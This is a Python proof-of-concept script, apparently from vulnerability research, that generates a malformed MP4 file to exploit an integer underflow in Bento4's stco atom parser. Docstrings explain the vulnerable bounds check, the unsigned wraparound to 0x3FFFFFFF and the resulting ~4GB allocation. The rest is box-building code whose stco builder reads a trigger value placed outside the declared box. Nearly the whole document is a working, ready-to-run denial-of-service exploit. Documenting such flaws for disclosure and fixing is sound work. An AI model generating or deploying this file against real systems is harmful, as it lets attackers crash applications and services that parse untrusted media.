#!/usr/bin/env python3
"""
PoC generator for VULN-003: AP4_StcoAtom integer underflow in bounds check.

Vulnerability: Ap4StcoAtom.cpp lines 78-81
    stream.ReadUI32(m_EntryCount);
    if (m_EntryCount > (size-AP4_FULL_ATOM_HEADER_SIZE-4)/4) {
        m_EntryCount = (size-AP4_FULL_ATOM_HEADER_SIZE-4)/4;
    }
    m_Entries = new AP4_UI32[m_EntryCount];

When size=12 (minimum allowed, since Create checks size < 12):
    AP4_FULL_ATOM_HEADER_SIZE = 12
    (12 - 12 - 4) / 4 with unsigned 32-bit arithmetic:
      = (0 - 4) / 4
      = 0xFFFFFFFC / 4
      = 0x3FFFFFFF

If m_EntryCount is read as 0x3FFFFFFF:
    0x3FFFFFFF > 0x3FFFFFFF => false => NO clamping
    new AP4_UI32[0x3FFFFFFF] => ~4GB allocation => bad_alloc crash

With size=12, there is no room for the entry_count field inside the declared
box. The constructor reads it anyway from the bytes that follow in the stream,
i.e. OUTSIDE the box's declared boundary. We craft those 4 bytes to be
0x3FFFFFFF.

CWE-191: Integer Underflow (unsigned wraparound)
CWE-770: Allocation of Resources Without Limits
"""

import struct
import os

OUT_DIR = os.path.dirname(os.path.abspath(__file__))
OUT_FILE = os.path.join(OUT_DIR, "vuln_003.mp4")


# ── Generic box helpers ──────────────────────────────────────────────────────

def make_box(fourcc, payload):
    """Return a standard box: 4-byte BE size + 4-byte fourcc + payload."""
    assert len(fourcc) == 4
    size = 4 + 4 + len(payload)
    return struct.pack(">I", size) + fourcc.encode("latin-1") + payload


def make_full_box(fourcc, version, flags, payload):
    """Return a FullBox: size + fourcc + version(1B) + flags(3B) + payload."""
    header = struct.pack(">B", version) + struct.pack(">I", flags)[1:]
    return make_box(fourcc, header + payload)


# ── Standard atom builders (unchanged from minimal MP4 skeleton) ─────────────

def build_ftyp():
    data = b"isom" + struct.pack(">I", 0) + b"isom" + b"mp41"
    return make_box("ftyp", data)


def build_mvhd():
    identity_matrix = struct.pack(
        ">9I",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000,
    )
    data = (
        struct.pack(">I", 0) +           # creation_time
        struct.pack(">I", 0) +           # modification_time
        struct.pack(">I", 1000) +        # timescale
        struct.pack(">I", 0) +           # duration
        struct.pack(">I", 0x00010000) +  # rate = 1.0
        struct.pack(">H", 0x0100) +      # volume = 1.0
        b"\x00" * 10 +                   # reserved
        identity_matrix +                # 36 bytes
        b"\x00" * 24 +                   # pre_defined (6 x 4 bytes)
        struct.pack(">I", 2)             # next_track_id
    )
    return make_full_box("mvhd", 0, 0, data)


def build_tkhd():
    identity_matrix = struct.pack(
        ">9I",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000,
    )
    data = (
        struct.pack(">I", 0) +       # creation_time
        struct.pack(">I", 0) +       # modification_time
        struct.pack(">I", 1) +       # track_id = 1
        struct.pack(">I", 0) +       # reserved
        struct.pack(">I", 0) +       # duration
        b"\x00" * 8 +                # reserved
        struct.pack(">H", 0) +       # layer
        struct.pack(">H", 0) +       # alternate_group
        struct.pack(">H", 0x0100) +  # volume
        struct.pack(">H", 0) +       # reserved
        identity_matrix +            # 36 bytes
        struct.pack(">I", 0) +       # width
        struct.pack(">I", 0)         # height
    )
    return make_full_box("tkhd", 0, 3, data)


def build_mdhd():
    data = (
        struct.pack(">I", 0) +      # creation_time
        struct.pack(">I", 0) +      # modification_time
        struct.pack(">I", 44100) +  # timescale
        struct.pack(">I", 0) +      # duration
        struct.pack(">H", 0x55C4) + # language = 'und'
        struct.pack(">H", 0)        # pre_defined
    )
    return make_full_box("mdhd", 0, 0, data)


def build_hdlr():
    data = (
        struct.pack(">I", 0) + # pre_defined
        b"soun" +              # handler_type
        b"\x00" * 12 +         # reserved
        b"\x00"                # empty name
    )
    return make_full_box("hdlr", 0, 0, data)


def build_smhd():
    data = struct.pack(">HH", 0, 0)  # balance + reserved
    return make_full_box("smhd", 0, 0, data)


def build_dref():
    url_entry = make_full_box("url ", 0, 1, b"")
    data = struct.pack(">I", 1) + url_entry
    return make_full_box("dref", 0, 0, data)


def build_dinf():
    return make_box("dinf", build_dref())


def build_stsd():
    data = struct.pack(">I", 0)  # entry_count = 0
    return make_full_box("stsd", 0, 0, data)


def build_stts():
    data = struct.pack(">I", 0)  # entry_count = 0
    return make_full_box("stts", 0, 0, data)


def build_stsz():
    data = struct.pack(">II", 0, 0)  # sample_size=0, sample_count=0
    return make_full_box("stsz", 0, 0, data)


# ── Malicious stco box ───────────────────────────────────────────────────────

def build_stco_malicious():
    """
    THE TRIGGER: craft stco with declared size=12.

    AP4_FULL_ATOM_HEADER_SIZE = 12
    Create() check: size < AP4_FULL_ATOM_HEADER_SIZE => 12 < 12 => FALSE => allowed

    The constructor reads entry_count AFTER the 12-byte full-atom header:
        Bytes  0- 3: size   = 0x0000000C (12)     <- read by AtomFactory
        Bytes  4- 7: type   = 'stco'              <- read by AtomFactory
        Bytes  8-11: version=0 + flags=0 (4B)     <- read by ReadFullHeader
        Bytes 12-15: entry_count                  <- read by constructor
                                                     (OUTSIDE declared box!)

    Bounds check: (size - 12 - 4) / 4 = (12 - 16) / 4
    Unsigned 32-bit: (0x0000000C - 0x00000010) / 4
                   = 0xFFFFFFFC / 4
                   = 0x3FFFFFFF   ← max_entry_count (underflow result)

    We write entry_count = 0x3FFFFFFF immediately after the 12-byte box.
    Check: 0x3FFFFFFF > 0x3FFFFFFF => false => NO clamping
    m_Entries = new AP4_UI32[0x3FFFFFFF]
             => 0x3FFFFFFF * 4 = ~4 GB allocation
             => std::bad_alloc => crash / OOM kill
    """
    # 12-byte stco full-atom header (size=12 leaves no room for entry_count)
    stco_box = struct.pack(">I", 12)  # size = 12
    stco_box += b"stco"               # fourcc
    stco_box += struct.pack(">I", 0)  # version=0, flags=0 (4 bytes)

    # These 4 bytes immediately follow the stco box in the stream.
    # The constructor's stream.ReadUI32(m_EntryCount) reads them as entry_count.
    trigger_entry_count = struct.pack(">I", 0x3FFFFFFF)

    return stco_box + trigger_entry_count


# ── Container builders ───────────────────────────────────────────────────────

def build_stbl():
    payload = (
        build_stsd() +
        build_stts() +
        build_stsz() +
        build_stco_malicious()  # <── underflow trigger here
    )
    return make_box("stbl", payload)


def build_minf():
    payload = build_smhd() + build_dinf() + build_stbl()
    return make_box("minf", payload)


def build_mdia():
    payload = build_mdhd() + build_hdlr() + build_minf()
    return make_box("mdia", payload)


def build_trak():
    payload = build_tkhd() + build_mdia()
    return make_box("trak", payload)


def build_moov():
    payload = build_mvhd() + build_trak()
    return make_box("moov", payload)


def build_mdat():
    return make_box("mdat", b"")


# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    mp4 = build_ftyp() + build_moov() + build_mdat()

    with open(OUT_FILE, "wb") as f:
        f.write(mp4)

    print(f"[+] Written {len(mp4)} bytes to {OUT_FILE}")
    print(f"[+] stco declared size = 12 (AP4_FULL_ATOM_HEADER_SIZE)")
    print(f"[+] Underflow: (12 - 12 - 4) / 4 = 0xFFFFFFFC / 4 = 0x3FFFFFFF")
    print(f"[+] entry_count in stream = 0x3FFFFFFF")
    print(f"[+] Expected: new AP4_UI32[0x3FFFFFFF] => ~4GB alloc => bad_alloc crash")


if __name__ == "__main__":
    main()
